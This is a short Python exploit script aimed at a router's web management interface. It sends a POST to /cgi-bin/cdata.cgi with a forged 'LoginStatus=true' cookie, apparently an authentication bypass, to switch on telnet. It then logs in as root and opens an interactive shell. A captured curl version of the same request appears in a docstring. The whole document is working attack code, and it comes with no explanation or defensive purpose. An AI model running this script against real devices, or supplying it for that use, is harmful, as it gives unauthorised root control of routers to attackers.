import requests, telnetlib, sys

'''
curl 'http://192.168.1.1/cgi-bin/cdata.cgi' 
-X POST
 -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0'
 -H 'Accept: application/json, text/javascript, */*; q=0.01' 
 -H 'Accept-Language: en-US,en;q=0.5' 
 -H 'Accept-Encoding: gzip, deflate'
 -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8'
 -H 'X-Requested-With: XMLHttpRequest'
 -H 'Origin: http://192.168.1.1'
 -H 'Connection: keep-alive'
 -H 'Referer: http://192.168.1.1/routerManagement/WEBManagement.shtml?time=1675996380013'
 -H 'Cookie: LoginStatus=true'
 --data-raw 'operation=DevManagement&opt=telnet&telnet=1'

'''

host = sys.argv[1]
url = 'http://'+host+'/cgi-bin/cdata.cgi'

cookies = {'LoginStatus':'true'}

headers = {
   'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
   'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
}

data = {
   'operation': 'DevManagement',
   'opt': 'telnet',
   'telnet': '1',
}

user = "root"
print("enabling telnet")

req = requests.post(url, headers=headers,data=data)

if req.text != '{ "err": 0 }':
   print("failed")

tn = telnetlib.Telnet(host, 23)
if (tn):
   print("connecting to session")
   tn.read_until(b"login: ")
   tn.write(user.encode('ascii') + b"\n")
   tn.interact()
